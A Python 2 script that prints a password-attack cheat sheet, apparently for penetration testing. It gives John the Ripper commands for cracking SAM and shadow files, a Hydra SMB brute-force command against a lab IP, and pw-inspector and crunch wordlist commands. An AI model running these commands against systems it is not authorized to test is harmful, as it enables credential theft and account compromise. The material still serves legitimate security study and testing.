#!/usr/bin/python                                                                                        
from random import randint
from os import system
import socket
import os, fnmatch

system('clear')

#ip=raw_input ("What is the target IP? : ")
#port=raw_input ("What is the target Port? : ")
#Rip=raw_input ("What is the Redirectors IP? : ")

class bcolors:
    WARNING = '\033[93m'
    ENDC = '\033[0m'
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    FAIL = '\033[91m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'
#print bcolors.OKGREEN + 'Download PowerCat:' + bcolors.ENDC
print bcolors.WARNING + 'Crack Windows SAM file:' + bcolors.ENDC
print 'john /tmp/sam.txt --wordlist=/usr/share/wordlists/rockyou.txt'
print 'john --show /tmp/sam.txt'
print (' ')
print bcolors.WARNING + 'Crack Linux Shadow & Passwd:' + bcolors.ENDC
print 'unshadow <password-file> <Shadow-file> > /tmp/combined.txt'
print 'john combined.txt --wordlist=/usr/share/wordlists/rockyou.txt'
print 'cat john.pot'
print (' ')
print bcolors.WARNING + 'Remote Password Guessing:' + bcolors.ENDC
print 'hydra -V -l administrator -P /usr/share/wordlists/rockyou.txt -m starwars -c 8 -w 10 smb://10.10.100.77:445'
print (' ')
print bcolors.WARNING + 'Trimming Wordlists:' + bcolors.ENDC
print ' pw-inspector -i /usr/share/wordlists/rockyou.txt -o /tmp/custom_passwd_list.txt'
print '-l         lowcase characters (a,b,c,d, etc.)'
print '-u         upcase characters (A,B,C,D, etc.)'
print '-n         numbers (1,2,3,4, etc.)'
print '-s         special characters - all others not withint the sets above'
print '-m         MINLEN  minimum length of a valid password'
print '-M          MAXLEN  maximum length of a valid password'
print (' ')
print bcolors.WARNING + 'Create Custom Wordlist:' + bcolors.ENDC
print 'crunch 8 10 -t @@@@1125 -o /tmp/xmas-wordlist.txt'
print 'crunch 8 8 -f /usr/share/rainbowcrack/charset.txt mixalpha -o /tmp/alpha-wordlist.txt'
print (' ')
print bcolors.FAIL + 'Use Cain(windows) to Sniff Password:' + bcolors.ENDC
print (' ')
